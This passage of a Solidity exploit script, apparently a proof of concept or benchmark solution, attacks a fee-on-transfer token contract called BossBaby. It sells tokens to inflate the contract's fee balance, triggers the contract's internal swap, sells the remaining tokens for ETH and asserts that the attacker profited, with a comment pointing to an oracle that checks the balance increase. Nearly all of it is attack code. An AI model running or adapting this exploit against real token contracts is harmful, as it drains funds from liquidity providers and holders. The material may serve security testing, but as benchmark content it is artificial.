            console.log('Generating more fees for contract...');

            // Approve router
            BossBaby(TARGET).approve(address(routerContract), tokenBalance);

            // Sell some tokens to generate fees
            path[0] = TARGET;
            path[1] = weth;

            // Sell 25% of tokens
            uint256 sellAmount = tokenBalance / 4;
            routerContract.swapExactTokensForETHSupportingFeeOnTransferTokens(
                sellAmount,
                0,
                path,
                attacker,
                block.timestamp + 1000
            );

            // Update token balance
            tokenBalance = BossBaby(TARGET).balanceOf(attacker);

            // Check contract balance again
            contractBalance = BossBaby(TARGET).balanceOf(TARGET);
            console.log('Contract token balance after sell:', contractBalance);
        }

        // Now contract should have enough tokens to trigger swap
        // Trigger swap by selling a small amount to the pair
        console.log('Triggering swap...');
        if (tokenBalance > 0) {
            // Sell small amount to trigger swap
            uint256 triggerAmount = tokenBalance / 100; // 1%

            routerContract.swapExactTokensForETHSupportingFeeOnTransferTokens(
                triggerAmount,
                0,
                path,
                attacker,
                block.timestamp + 1000
            );

            // Update token balance
            tokenBalance = BossBaby(TARGET).balanceOf(attacker);
        }

        // Now sell remaining tokens at (hopefully) higher price
        console.log('Selling remaining tokens...');
        if (tokenBalance > 0) {
            routerContract.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenBalance,
                0,
                path,
                attacker,
                block.timestamp + 1000
            );
        }

        // Check final ETH balance
        uint256 finalEthBalance = attacker.balance;
        console.log('Final attacker ETH:', finalEthBalance);
        console.log('Profit:', finalEthBalance - initialEthBalance);

        // The oracle checks attacker_balance_increased
        require(finalEthBalance > initialEthBalance, 'Attack failed: ETH balance did not increase');
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
